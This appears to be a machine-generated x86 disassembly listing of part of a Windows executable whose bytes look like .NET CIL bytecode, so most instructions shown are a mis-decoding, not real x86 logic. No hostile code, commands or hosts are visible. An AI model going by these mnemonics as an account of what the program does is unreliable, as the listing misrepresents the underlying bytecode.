  4025c2:	23 00                	and    (%eax),%eax
  4025c4:	00 04 73             	add    %al,(%ebx,%esi,2)
  4025c7:	1e                   	push   %ds
  4025c8:	01 00                	add    %eax,(%eax)
  4025ca:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  4025d0:	73 03                	jae    0x4025d5
  4025d2:	01 00                	add    %eax,(%eax)
  4025d4:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4025da:	2a 66 02             	sub    0x2(%esi),%ah
  4025dd:	28 03                	sub    %al,(%ebx)
  4025df:	01 00                	add    %eax,(%eax)
  4025e1:	0a 02                	or     (%edx),%al
  4025e3:	03 7d 29             	add    0x29(%ebp),%edi
  4025e6:	00 00                	add    %al,(%eax)
  4025e8:	04 02                	add    $0x2,%al
  4025ea:	28 1f                	sub    %bl,(%edi)
  4025ec:	01 00                	add    %eax,(%eax)
  4025ee:	0a 7d 2b             	or     0x2b(%ebp),%bh
  4025f1:	00 00                	add    %al,(%eax)
  4025f3:	04 2a                	add    $0x2a,%al
  4025f5:	06                   	push   %es
  4025f6:	2a 1e                	sub    (%esi),%bl
  4025f8:	02 7b 2a             	add    0x2a(%ebx),%bh
  4025fb:	00 00                	add    %al,(%eax)
  4025fd:	04 2a                	add    $0x2a,%al
  4025ff:	1e                   	push   %ds
  402600:	02 28                	add    (%eax),%ch
  402602:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402603:	00 00                	add    %al,(%eax)
  402605:	06                   	push   %es
  402606:	2a 66 02             	sub    0x2(%esi),%ah
  402609:	28 03                	sub    %al,(%ebx)
  40260b:	01 00                	add    %eax,(%eax)
  40260d:	0a 02                	or     (%edx),%al
  40260f:	03 7d 35             	add    0x35(%ebp),%edi
  402612:	00 00                	add    %al,(%eax)
  402614:	04 02                	add    $0x2,%al
  402616:	28 1f                	sub    %bl,(%edi)
  402618:	01 00                	add    %eax,(%eax)
  40261a:	0a 7d 37             	or     0x37(%ebp),%bh
  40261d:	00 00                	add    %al,(%eax)
  40261f:	04 2a                	add    $0x2a,%al
  402621:	6e                   	outsb  %ds:(%esi),(%dx)
  402622:	02 15 7d 35 00 00    	add    0x357d,%dl
  402628:	04 02                	add    $0x2,%al
  40262a:	7b 3e                	jnp    0x40266a
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 2c                	add    $0x2c,%al
  402630:	0b 02                	or     (%edx),%eax
  402632:	7b 3e                	jnp    0x402672
  402634:	00 00                	add    %al,(%eax)
  402636:	04 6f                	add    $0x6f,%al
  402638:	19 00                	sbb    %eax,(%eax)
  40263a:	00 0a                	add    %cl,(%edx)
  40263c:	2a 1e                	sub    (%esi),%bl
  40263e:	02 7b 36             	add    0x36(%ebx),%bh
  402641:	00 00                	add    %al,(%eax)
  402643:	04 2a                	add    $0x2a,%al
  402645:	1e                   	push   %ds
  402646:	02 28                	add    (%eax),%ch
  402648:	b0 00                	mov    $0x0,%al
  40264a:	00 06                	add    %al,(%esi)
  40264c:	2a 16                	sub    (%esi),%dl
  40264e:	03 04 fe             	add    (%esi,%edi,8),%eax
  402651:	01 2a                	add    %ebp,(%edx)
  402653:	1e                   	push   %ds
  402654:	03 28                	add    (%eax),%ebp
  402656:	31 01                	xor    %eax,(%ecx)
  402658:	00 0a                	add    %cl,(%edx)
  40265a:	2a 2e                	sub    (%esi),%ch
  40265c:	73 b4                	jae    0x402612
  40265e:	00 00                	add    %al,(%eax)
  402660:	06                   	push   %es
  402661:	80 3f 00             	cmpb   $0x0,(%edi)
  402664:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402667:	1e                   	push   %ds
  402668:	02 28                	add    (%eax),%ch
  40266a:	51                   	push   %ecx
  40266b:	00 00                	add    %al,(%eax)
  40266d:	06                   	push   %es
  40266e:	2a 52 02             	sub    0x2(%edx),%dl
  402671:	03 28                	add    (%eax),%ebp
  402673:	52                   	push   %edx
  402674:	00 00                	add    %al,(%eax)
  402676:	06                   	push   %es
  402677:	02 03                	add    (%ebx),%al
  402679:	74 1b                	je     0x402696
  40267b:	00 00                	add    %al,(%eax)
  40267d:	1b 7d 32             	sbb    0x32(%ebp),%edi
  402680:	01 00                	add    %eax,(%eax)
  402682:	0a 2a                	or     (%edx),%ch
  402684:	32 02                	xor    (%edx),%al
  402686:	7b 32                	jnp    0x4026ba
  402688:	01 00                	add    %eax,(%eax)
  40268a:	0a 6f 33             	or     0x33(%edi),%ch
  40268d:	01 00                	add    %eax,(%eax)
  40268f:	0a 2a                	or     (%edx),%ch
  402691:	1e                   	push   %ds
  402692:	02 28                	add    (%eax),%ch
  402694:	56                   	push   %esi
  402695:	00 00                	add    %al,(%eax)
  402697:	06                   	push   %es
  402698:	2a 52 02             	sub    0x2(%edx),%dl
  40269b:	03 28                	add    (%eax),%ebp
  40269d:	52                   	push   %edx
  40269e:	00 00                	add    %al,(%eax)
  4026a0:	06                   	push   %es
  4026a1:	02 03                	add    (%ebx),%al
  4026a3:	74 26                	je     0x4026cb
  4026a5:	00 00                	add    %al,(%eax)
  4026a7:	01 7d 41             	add    %edi,0x41(%ebp)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	04 2a                	add    $0x2a,%al
  4026ae:	32 02                	xor    (%edx),%al
  4026b0:	7b 41                	jnp    0x4026f3
  4026b2:	00 00                	add    %al,(%eax)
  4026b4:	04 6f                	add    $0x6f,%al
  4026b6:	35 01 00 0a 2a       	xor    $0x2a0a0001,%eax
  4026bb:	3a 02                	cmp    (%edx),%al
  4026bd:	7b 41                	jnp    0x402700
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	04 03                	add    $0x3,%al
  4026c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4026c4:	36 01 00             	add    %eax,%ss:(%eax)
  4026c7:	0a 26                	or     (%esi),%ah
  4026c9:	2a 3a                	sub    (%edx),%bh
  4026cb:	02 28                	add    (%eax),%ch
  4026cd:	03 01                	add    (%ecx),%eax
  4026cf:	00 0a                	add    %cl,(%edx)
  4026d1:	02 03                	add    (%ebx),%al
  4026d3:	7d 42                	jge    0x402717
  4026d5:	00 00                	add    %al,(%eax)
  4026d7:	04 2a                	add    $0x2a,%al
  4026d9:	36 02 7b 42          	add    %ss:0x42(%ebx),%bh
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	04 03                	add    $0x3,%al
  4026e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e2:	8e 00                	mov    (%eax),%es
  4026e4:	00 0a                	add    %cl,(%edx)
  4026e6:	2a 3a                	sub    (%edx),%bh
  4026e8:	02 7b 42             	add    0x42(%ebx),%bh
  4026eb:	00 00                	add    %al,(%eax)
  4026ed:	04 03                	add    $0x3,%al
  4026ef:	04 6f                	add    $0x6f,%al
  4026f1:	37                   	aaa
  4026f2:	01 00                	add    %eax,(%eax)
  4026f4:	0a 2a                	or     (%edx),%ch
  4026f6:	3a 02                	cmp    (%edx),%al
  4026f8:	28 03                	sub    %al,(%ebx)
  4026fa:	01 00                	add    %eax,(%eax)
  4026fc:	0a 02                	or     (%edx),%al
  4026fe:	03 7d 43             	add    0x43(%ebp),%edi
  402701:	00 00                	add    %al,(%eax)
  402703:	04 2a                	add    $0x2a,%al
  402705:	36 02 7b 43          	add    %ss:0x43(%ebx),%bh
  402709:	00 00                	add    %al,(%eax)
  40270b:	04 03                	add    $0x3,%al
  40270d:	6f                   	outsl  %ds:(%esi),(%dx)
  40270e:	38 01                	cmp    %al,(%ecx)
  402710:	00 0a                	add    %cl,(%edx)
  402712:	2a 72 02             	sub    0x2(%edx),%dh
  402715:	7b 43                	jnp    0x40275a
  402717:	00 00                	add    %al,(%eax)
  402719:	04 6f                	add    $0x6f,%al
  40271b:	2e 01 00             	add    %eax,%cs:(%eax)
  40271e:	0a 2c 01             	or     (%ecx,%eax,1),%ch
  402721:	2a 02                	sub    (%edx),%al
  402723:	7b 43                	jnp    0x402768
  402725:	00 00                	add    %al,(%eax)
  402727:	04 03                	add    $0x3,%al
  402729:	04 6f                	add    $0x6f,%al
  40272b:	39 01                	cmp    %eax,(%ecx)
  40272d:	00 0a                	add    %cl,(%edx)
  40272f:	2a 86 02 7b 3c 01    	sub    0x13c7b02(%esi),%al
  402735:	00 0a                	add    %cl,(%edx)
  402737:	2d 02 14 2a 02       	sub    $0x22a1402,%eax
  40273c:	7b 3c                	jnp    0x40277a
  40273e:	01 00                	add    %eax,(%eax)
  402740:	0a 03                	or     (%ebx),%al
  402742:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402743:	1d 00 00 1b 6f       	sbb    $0x6f1b0000,%eax
  402748:	3f                   	aas
  402749:	01 00                	add    %eax,(%eax)
  40274b:	0a 8c 21 00 00 1b 2a 	or     0x2a1b0000(%ecx,%eiz,1),%cl
  402752:	86 02                	xchg   %al,(%edx)
  402754:	7b 3e                	jnp    0x402794
  402756:	01 00                	add    %eax,(%eax)
  402758:	0a 2d 01 2a 02 7b    	or     0x7b022a01,%ch
  40275e:	3e 01 00             	add    %eax,%ds:(%eax)
  402761:	0a 03                	or     (%ebx),%al
  402763:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402764:	1d 00 00 1b 04       	sbb    $0x41b0000,%eax
  402769:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40276a:	21 00                	and    %eax,(%eax)
  40276c:	00 1b                	add    %bl,(%ebx)
  40276e:	6f                   	outsl  %ds:(%esi),(%dx)
  40276f:	40                   	inc    %eax
  402770:	01 00                	add    %eax,(%eax)
  402772:	0a 2a                	or     (%edx),%ch
  402774:	9e                   	sahf
  402775:	02 7e b1             	add    -0x4f(%esi),%bh
  402778:	00 00                	add    %al,(%eax)
  40277a:	0a 28                	or     (%eax),%ch
  40277c:	41                   	inc    %ecx
  40277d:	01 00                	add    %eax,(%eax)
  40277f:	0a 2c 18             	or     (%eax,%ebx,1),%ch
  402782:	02 7e 42             	add    0x42(%esi),%bh
  402785:	01 00                	add    %eax,(%eax)
  402787:	0a 28                	or     (%eax),%ch
  402789:	41                   	inc    %ecx
  40278a:	01 00                	add    %eax,(%eax)
  40278c:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  40278f:	0f 00 28             	verw   (%eax)
  402792:	e4 00                	in     $0x0,%al
  402794:	00 0a                	add    %cl,(%edx)
  402796:	16                   	push   %ss
  402797:	fe 03                	incb   (%ebx)
  402799:	2a 16                	sub    (%esi),%dl
  40279b:	2a 26                	sub    (%esi),%ah
  40279d:	02 14 03             	add    (%ebx,%eax,1),%dl
  4027a0:	28 07                	sub    %al,(%edi)
  4027a2:	00 00                	add    %al,(%eax)
  4027a4:	2b 2a                	sub    (%edx),%ebp
  4027a6:	2a 02                	sub    (%edx),%al
  4027a8:	03 14 04             	add    (%esp,%eax,1),%edx
  4027ab:	28 d7                	sub    %dl,%bh
  4027ad:	00 00                	add    %al,(%eax)
  4027af:	06                   	push   %es
  4027b0:	2a a2 02 14 28 4f    	sub    0x4f281402(%edx),%ah
  4027b6:	00 00                	add    %al,(%eax)
  4027b8:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  4027bb:	72 58                	jb     0x402815
  4027bd:	01 00                	add    %eax,(%eax)
  4027bf:	70 73                	jo     0x402834
  4027c1:	4b                   	dec    %ebx
  4027c2:	00 00                	add    %al,(%eax)
  4027c4:	0a 7a 02             	or     0x2(%edx),%bh
  4027c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c8:	50                   	push   %eax
  4027c9:	00 00                	add    %al,(%eax)
  4027cb:	0a 2c 0a             	or     (%edx,%ecx,1),%ch
  4027ce:	02 28                	add    (%eax),%ch
  4027d0:	df 00                	filds  (%eax)
  4027d2:	00 06                	add    %al,(%esi)
  4027d4:	16                   	push   %ss
  4027d5:	fe 01                	incb   (%ecx)
  4027d7:	2a 16                	sub    (%esi),%dl
  4027d9:	2a d2                	sub    %dl,%dl
  4027db:	02 14 28             	add    (%eax,%ebp,1),%dl
  4027de:	4f                   	dec    %edi
  4027df:	00 00                	add    %al,(%eax)
  4027e1:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  4027e4:	72 58                	jb     0x40283e
  4027e6:	01 00                	add    %eax,(%eax)
  4027e8:	70 73                	jo     0x40285d
  4027ea:	4b                   	dec    %ebx
  4027eb:	00 00                	add    %al,(%eax)
  4027ed:	0a 7a 02             	or     0x2(%edx),%bh
  4027f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4027f1:	5e                   	pop    %esi
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	0a 2c 16             	or     (%esi,%edx,1),%ch
  4027f7:	02 6f 5f             	add    0x5f(%edi),%ch
  4027fa:	00 00                	add    %al,(%eax)
  4027fc:	0a d0                	or     %al,%dl
  4027fe:	11 00                	adc    %eax,(%eax)
  402800:	00 01                	add    %al,(%ecx)
  402802:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402805:	00 0a                	add    %cl,(%edx)
  402807:	28 4f 00             	sub    %cl,0x0(%edi)
  40280a:	00 0a                	add    %cl,(%edx)
  40280c:	2a 16                	sub    (%esi),%dl
  40280e:	2a ea                	sub    %dl,%ch
  402810:	1b 8d 68 00 00 01    	sbb    0x1000068(%ebp),%ecx
  402816:	25 d0 e0 00 00       	and    $0xe0d0,%eax
  40281b:	04 28                	add    $0x28,%al
  40281d:	6f                   	outsl  %ds:(%esi),(%dx)
  40281e:	01 00                	add    %eax,(%eax)
  402820:	0a 80 46 00 00 04    	or     0x4000046(%eax),%al
  402826:	19 8d 55 00 00 01    	sbb    %ecx,0x1000055(%ebp)
  40282c:	25 16 72 3a 0a       	and    $0xa3a7216,%eax
  402831:	00 70 a2             	add    %dh,-0x5e(%eax)
  402834:	25 17 72 7c 0a       	and    $0xa7c7217,%eax
  402839:	00 70 a2             	add    %dh,-0x5e(%eax)
  40283c:	25 18 72 b4 0a       	and    $0xab47218,%eax
  402841:	00 70 a2             	add    %dh,-0x5e(%eax)
  402844:	80 47 00 00          	addb   $0x0,0x0(%edi)
  402848:	04 2a                	add    $0x2a,%al
  40284a:	1e                   	push   %ds
  40284b:	02 7b 4b             	add    0x4b(%ebx),%bh
  40284e:	00 00                	add    %al,(%eax)
  402850:	04 2a                	add    $0x2a,%al
  402852:	22 02                	and    (%edx),%al
  402854:	03 7d 4b             	add    0x4b(%ebp),%edi
  402857:	00 00                	add    %al,(%eax)
  402859:	04 2a                	add    $0x2a,%al
  40285b:	1e                   	push   %ds
  40285c:	02 7b 4c             	add    0x4c(%ebx),%bh
  40285f:	00 00                	add    %al,(%eax)
  402861:	04 2a                	add    $0x2a,%al
  402863:	22 02                	and    (%edx),%al
  402865:	03 7d 4c             	add    0x4c(%ebp),%edi
  402868:	00 00                	add    %al,(%eax)
  40286a:	04 2a                	add    $0x2a,%al
  40286c:	1e                   	push   %ds
  40286d:	02 7b 4d             	add    0x4d(%ebx),%bh
  402870:	00 00                	add    %al,(%eax)
  402872:	04 2a                	add    $0x2a,%al
  402874:	22 02                	and    (%edx),%al
  402876:	03 7d 4d             	add    0x4d(%ebp),%edi
  402879:	00 00                	add    %al,(%eax)
  40287b:	04 2a                	add    $0x2a,%al
  40287d:	1e                   	push   %ds
  40287e:	02 7b 4e             	add    0x4e(%ebx),%bh
  402881:	00 00                	add    %al,(%eax)
  402883:	04 2a                	add    $0x2a,%al
  402885:	22 02                	and    (%edx),%al
  402887:	03 7d 4e             	add    0x4e(%ebp),%edi
  40288a:	00 00                	add    %al,(%eax)
  40288c:	04 2a                	add    $0x2a,%al
  40288e:	1e                   	push   %ds
  40288f:	02 7b 4f             	add    0x4f(%ebx),%bh
  402892:	00 00                	add    %al,(%eax)
  402894:	04 2a                	add    $0x2a,%al
  402896:	22 02                	and    (%edx),%al
  402898:	03 7d 4f             	add    0x4f(%ebp),%edi
  40289b:	00 00                	add    %al,(%eax)
  40289d:	04 2a                	add    $0x2a,%al
  40289f:	1e                   	push   %ds
  4028a0:	02 7b 50             	add    0x50(%ebx),%bh
  4028a3:	00 00                	add    %al,(%eax)
  4028a5:	04 2a                	add    $0x2a,%al
  4028a7:	22 02                	and    (%edx),%al
  4028a9:	03 7d 50             	add    0x50(%ebp),%edi
  4028ac:	00 00                	add    %al,(%eax)
  4028ae:	04 2a                	add    $0x2a,%al
  4028b0:	1e                   	push   %ds
  4028b1:	02 7b 51             	add    0x51(%ebx),%bh
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	04 2a                	add    $0x2a,%al
  4028b8:	22 02                	and    (%edx),%al
  4028ba:	03 7d 51             	add    0x51(%ebp),%edi
  4028bd:	00 00                	add    %al,(%eax)
  4028bf:	04 2a                	add    $0x2a,%al
  4028c1:	1e                   	push   %ds
  4028c2:	02 7b 52             	add    0x52(%ebx),%bh
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	04 2a                	add    $0x2a,%al
  4028c9:	22 02                	and    (%edx),%al
  4028cb:	03 7d 52             	add    0x52(%ebp),%edi
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	04 2a                	add    $0x2a,%al
  4028d2:	1e                   	push   %ds
  4028d3:	02 7b 53             	add    0x53(%ebx),%bh
  4028d6:	00 00                	add    %al,(%eax)
  4028d8:	04 2a                	add    $0x2a,%al
  4028da:	22 02                	and    (%edx),%al
  4028dc:	03 7d 53             	add    0x53(%ebp),%edi
  4028df:	00 00                	add    %al,(%eax)
  4028e1:	04 2a                	add    $0x2a,%al
  4028e3:	32 02                	xor    (%edx),%al
  4028e5:	7b 49                	jnp    0x402930
  4028e7:	00 00                	add    %al,(%eax)
  4028e9:	04 6f                	add    $0x6f,%al
  4028eb:	71 01                	jno    0x4028ee
  4028ed:	00 0a                	add    %cl,(%edx)
  4028ef:	2a 0a                	sub    (%edx),%cl
  4028f1:	04 2a                	add    $0x2a,%al
  4028f3:	1e                   	push   %ds
  4028f4:	02 7b 54             	add    0x54(%ebx),%bh
  4028f7:	00 00                	add    %al,(%eax)
  4028f9:	04 2a                	add    $0x2a,%al
  4028fb:	22 02                	and    (%edx),%al
  4028fd:	03 7d 54             	add    0x54(%ebp),%edi
  402900:	00 00                	add    %al,(%eax)
  402902:	04 2a                	add    $0x2a,%al
  402904:	1e                   	push   %ds
  402905:	02 7b 55             	add    0x55(%ebx),%bh
  402908:	00 00                	add    %al,(%eax)
  40290a:	04 2a                	add    $0x2a,%al
  40290c:	22 02                	and    (%edx),%al
  40290e:	03 7d 55             	add    0x55(%ebp),%edi
  402911:	00 00                	add    %al,(%eax)
  402913:	04 2a                	add    $0x2a,%al
  402915:	1e                   	push   %ds
  402916:	02 7b 56             	add    0x56(%ebx),%bh
  402919:	00 00                	add    %al,(%eax)
  40291b:	04 2a                	add    $0x2a,%al
  40291d:	22 02                	and    (%edx),%al
  40291f:	03 7d 56             	add    0x56(%ebp),%edi
  402922:	00 00                	add    %al,(%eax)
  402924:	04 2a                	add    $0x2a,%al
  402926:	1e                   	push   %ds
  402927:	02 7b 57             	add    0x57(%ebx),%bh
  40292a:	00 00                	add    %al,(%eax)
  40292c:	04 2a                	add    $0x2a,%al
  40292e:	22 02                	and    (%edx),%al
  402930:	03 7d 57             	add    0x57(%ebp),%edi
  402933:	00 00                	add    %al,(%eax)
  402935:	04 2a                	add    $0x2a,%al
  402937:	1e                   	push   %ds
  402938:	02 7b 58             	add    0x58(%ebx),%bh
  40293b:	00 00                	add    %al,(%eax)
  40293d:	04 2a                	add    $0x2a,%al
  40293f:	22 02                	and    (%edx),%al
  402941:	03 7d 58             	add    0x58(%ebp),%edi
  402944:	00 00                	add    %al,(%eax)
  402946:	04 2a                	add    $0x2a,%al
  402948:	1e                   	push   %ds
  402949:	02 7b 59             	add    0x59(%ebx),%bh
  40294c:	00 00                	add    %al,(%eax)
  40294e:	04 2a                	add    $0x2a,%al
  402950:	22 02                	and    (%edx),%al
  402952:	03 7d 59             	add    0x59(%ebp),%edi
  402955:	00 00                	add    %al,(%eax)
  402957:	04 2a                	add    $0x2a,%al
  402959:	1e                   	push   %ds
  40295a:	02 7b 5a             	add    0x5a(%ebx),%bh
  40295d:	00 00                	add    %al,(%eax)
  40295f:	04 2a                	add    $0x2a,%al
  402961:	22 02                	and    (%edx),%al
  402963:	03 7d 5a             	add    0x5a(%ebp),%edi
  402966:	00 00                	add    %al,(%eax)
  402968:	04 2a                	add    $0x2a,%al
  40296a:	1e                   	push   %ds
  40296b:	02 7b 5b             	add    0x5b(%ebx),%bh
  40296e:	00 00                	add    %al,(%eax)
  402970:	04 2a                	add    $0x2a,%al
  402972:	22 02                	and    (%edx),%al
  402974:	03 7d 5b             	add    0x5b(%ebp),%edi
  402977:	00 00                	add    %al,(%eax)
  402979:	04 2a                	add    $0x2a,%al
  40297b:	1e                   	push   %ds
  40297c:	02 7b 5c             	add    0x5c(%ebx),%bh
  40297f:	00 00                	add    %al,(%eax)
  402981:	04 2a                	add    $0x2a,%al
  402983:	22 02                	and    (%edx),%al
  402985:	03 7d 5c             	add    0x5c(%ebp),%edi
  402988:	00 00                	add    %al,(%eax)
  40298a:	04 2a                	add    $0x2a,%al
  40298c:	46                   	inc    %esi
  40298d:	20 00                	and    %al,(%eax)
  40298f:	02 00                	add    (%eax),%al
  402991:	00 02                	add    %al,(%edx)
  402993:	6f                   	outsl  %ds:(%esi),(%dx)
  402994:	f1                   	int1
  402995:	00 00                	add    %al,(%eax)
  402997:	06                   	push   %es
  402998:	28 75 01             	sub    %dh,0x1(%ebp)
  40299b:	00 0a                	add    %cl,(%edx)
  40299d:	2a 22                	sub    (%edx),%ah
  40299f:	1f                   	pop    %ds
  4029a0:	47                   	inc    %edi
  4029a1:	80 4a 00 00          	orb    $0x0,0x0(%edx)
  4029a5:	04 2a                	add    $0x2a,%al
  4029a7:	3a 02                	cmp    (%edx),%al
  4029a9:	03 04 05 0e 04 14 14 	add    0x1414040e(,%eax,1),%eax
  4029b0:	28 14 01             	sub    %dl,(%ecx,%eax,1)
  4029b3:	00 06                	add    %al,(%esi)
  4029b5:	2a d2                	sub    %dl,%dl
  4029b7:	02 28                	add    (%eax),%ch
  4029b9:	77 01                	ja     0x4029bc
  4029bb:	00 0a                	add    %cl,(%edx)
  4029bd:	02 0e                	add    (%esi),%cl
  4029bf:	04 7d                	add    $0x7d,%al
  4029c1:	67 00 00             	add    %al,(%bx,%si)
  4029c4:	04 02                	add    $0x2,%al
  4029c6:	03 7d 68             	add    0x68(%ebp),%edi
  4029c9:	00 00                	add    %al,(%eax)
  4029cb:	04 02                	add    $0x2,%al
  4029cd:	05 7d 69 00 00       	add    $0x697d,%eax
  4029d2:	04 02                	add    $0x2,%al
  4029d4:	04 6f                	add    $0x6f,%al
  4029d6:	20 01                	and    %al,(%ecx)
  4029d8:	00 06                	add    %al,(%esi)
  4029da:	02 0e                	add    (%esi),%cl
  4029dc:	05 6f 22 01 00       	add    $0x1226f,%eax
  4029e1:	06                   	push   %es
  4029e2:	02 0e                	add    (%esi),%cl
  4029e4:	06                   	push   %es
  4029e5:	7d 6a                	jge    0x402a51
  4029e7:	00 00                	add    %al,(%eax)
  4029e9:	04 2a                	add    $0x2a,%al
  4029eb:	1e                   	push   %ds
  4029ec:	02 7b 67             	add    0x67(%ebx),%bh
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	04 2a                	add    $0x2a,%al
  4029f3:	1e                   	push   %ds
  4029f4:	02 7b 68             	add    0x68(%ebx),%bh
  4029f7:	00 00                	add    %al,(%eax)
  4029f9:	04 2a                	add    $0x2a,%al
  4029fb:	1e                   	push   %ds
  4029fc:	02 7b 69             	add    0x69(%ebx),%bh
  4029ff:	00 00                	add    %al,(%eax)
  402a01:	04 2a                	add    $0x2a,%al
  402a03:	1e                   	push   %ds
  402a04:	02 7b 6a             	add    0x6a(%ebx),%bh
  402a07:	00 00                	add    %al,(%eax)
  402a09:	04 2a                	add    $0x2a,%al
  402a0b:	1e                   	push   %ds
  402a0c:	02 7b 6b             	add    0x6b(%ebx),%bh
  402a0f:	00 00                	add    %al,(%eax)
  402a11:	04 2a                	add    $0x2a,%al
  402a13:	22 02                	and    (%edx),%al
  402a15:	03 7d 6b             	add    0x6b(%ebp),%edi
  402a18:	00 00                	add    %al,(%eax)
  402a1a:	04 2a                	add    $0x2a,%al
  402a1c:	1e                   	push   %ds
  402a1d:	02 7b 6c             	add    0x6c(%ebx),%bh
  402a20:	00 00                	add    %al,(%eax)
  402a22:	04 2a                	add    $0x2a,%al
  402a24:	22 02                	and    (%edx),%al
  402a26:	03 7d 6c             	add    0x6c(%ebp),%edi
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	04 2a                	add    $0x2a,%al
  402a2d:	1e                   	push   %ds
  402a2e:	02 7b 6d             	add    0x6d(%ebx),%bh
  402a31:	00 00                	add    %al,(%eax)
  402a33:	04 2a                	add    $0x2a,%al
  402a35:	22 02                	and    (%edx),%al
  402a37:	03 7d 6d             	add    0x6d(%ebp),%edi
  402a3a:	00 00                	add    %al,(%eax)
  402a3c:	04 2a                	add    $0x2a,%al
  402a3e:	1e                   	push   %ds
  402a3f:	02 7b 6e             	add    0x6e(%ebx),%bh
  402a42:	00 00                	add    %al,(%eax)
  402a44:	04 2a                	add    $0x2a,%al
  402a46:	22 02                	and    (%edx),%al
  402a48:	03 7d 6e             	add    0x6e(%ebp),%edi
  402a4b:	00 00                	add    %al,(%eax)
  402a4d:	04 2a                	add    $0x2a,%al
  402a4f:	1e                   	push   %ds
  402a50:	02 7b 6f             	add    0x6f(%ebx),%bh
  402a53:	00 00                	add    %al,(%eax)
  402a55:	04 2a                	add    $0x2a,%al
  402a57:	22 02                	and    (%edx),%al
  402a59:	03 7d 6f             	add    0x6f(%ebp),%edi
  402a5c:	00 00                	add    %al,(%eax)
  402a5e:	04 2a                	add    $0x2a,%al
  402a60:	1e                   	push   %ds
  402a61:	02 28                	add    (%eax),%ch
  402a63:	78 01                	js     0x402a66
  402a65:	00 0a                	add    %cl,(%edx)
  402a67:	2a 3a                	sub    (%edx),%bh
  402a69:	02 28                	add    (%eax),%ch
  402a6b:	78 01                	js     0x402a6e
  402a6d:	00 0a                	add    %cl,(%edx)
  402a6f:	02 03                	add    (%ebx),%al
  402a71:	28 26                	sub    %ah,(%esi)
  402a73:	01 00                	add    %eax,(%eax)
  402a75:	06                   	push   %es
  402a76:	2a 1e                	sub    (%esi),%bl
  402a78:	02 7b 70             	add    0x70(%ebx),%bh
  402a7b:	00 00                	add    %al,(%eax)
  402a7d:	04 2a                	add    $0x2a,%al
  402a7f:	22 02                	and    (%edx),%al
  402a81:	03 7d 70             	add    0x70(%ebp),%edi
  402a84:	00 00                	add    %al,(%eax)
  402a86:	04 2a                	add    $0x2a,%al
  402a88:	1e                   	push   %ds
  402a89:	02 7b 71             	add    0x71(%ebx),%bh
  402a8c:	00 00                	add    %al,(%eax)
  402a8e:	04 2a                	add    $0x2a,%al
  402a90:	22 02                	and    (%edx),%al
  402a92:	03 7d 71             	add    0x71(%ebp),%edi
  402a95:	00 00                	add    %al,(%eax)
  402a97:	04 2a                	add    $0x2a,%al
  402a99:	1e                   	push   %ds
  402a9a:	02 7b 72             	add    0x72(%ebx),%bh
  402a9d:	00 00                	add    %al,(%eax)
  402a9f:	04 2a                	add    $0x2a,%al
  402aa1:	22 02                	and    (%edx),%al
  402aa3:	03 7d 72             	add    0x72(%ebp),%edi
  402aa6:	00 00                	add    %al,(%eax)
  402aa8:	04 2a                	add    $0x2a,%al
  402aaa:	1e                   	push   %ds
  402aab:	02 7b 73             	add    0x73(%ebx),%bh
  402aae:	00 00                	add    %al,(%eax)
  402ab0:	04 2a                	add    $0x2a,%al
  402ab2:	22 02                	and    (%edx),%al
  402ab4:	03 7d 73             	add    0x73(%ebp),%edi
  402ab7:	00 00                	add    %al,(%eax)
  402ab9:	04 2a                	add    $0x2a,%al
  402abb:	1e                   	push   %ds
  402abc:	02 7b 74             	add    0x74(%ebx),%bh
  402abf:	00 00                	add    %al,(%eax)
  402ac1:	04 2a                	add    $0x2a,%al
  402ac3:	22 02                	and    (%edx),%al
  402ac5:	03 7d 74             	add    0x74(%ebp),%edi
  402ac8:	00 00                	add    %al,(%eax)
  402aca:	04 2a                	add    $0x2a,%al
  402acc:	32 02                	xor    (%edx),%al
  402ace:	72 55                	jb     0x402b25
  402ad0:	0c 00                	or     $0x0,%al
  402ad2:	70 28                	jo     0x402afc
  402ad4:	79 01                	jns    0x402ad7
  402ad6:	00 0a                	add    %cl,(%edx)
  402ad8:	2a 22                	sub    (%edx),%ah
  402ada:	02 03                	add    (%ebx),%al
  402adc:	28 79 01             	sub    %bh,0x1(%ecx)
  402adf:	00 0a                	add    %cl,(%edx)
  402ae1:	2a 26                	sub    (%esi),%ah
  402ae3:	02 03                	add    (%ebx),%al
  402ae5:	04 28                	add    $0x28,%al
  402ae7:	7a 01                	jp     0x402aea
  402ae9:	00 0a                	add    %cl,(%edx)
  402aeb:	2a 26                	sub    (%esi),%ah
  402aed:	02 14 03             	add    (%ebx,%eax,1),%dl
  402af0:	28 7a 01             	sub    %bh,0x1(%edx)
  402af3:	00 0a                	add    %cl,(%edx)
  402af5:	2a 26                	sub    (%esi),%ah
  402af7:	02 03                	add    (%ebx),%al
  402af9:	04 28                	add    $0x28,%al
  402afb:	7b 01                	jnp    0x402afe
  402afd:	00 0a                	add    %cl,(%edx)
  402aff:	2a 32                	sub    (%edx),%dh
  402b01:	02 6f 7d             	add    0x7d(%edi),%ch
  402b04:	01 00                	add    %eax,(%eax)
  402b06:	0a 28                	or     (%eax),%ch
  402b08:	34 01                	xor    $0x1,%al
  402b0a:	00 06                	add    %al,(%esi)
  402b0c:	2a 1e                	sub    (%esi),%bl
  402b0e:	02 28                	add    (%eax),%ch
  402b10:	39 01                	cmp    %eax,(%ecx)
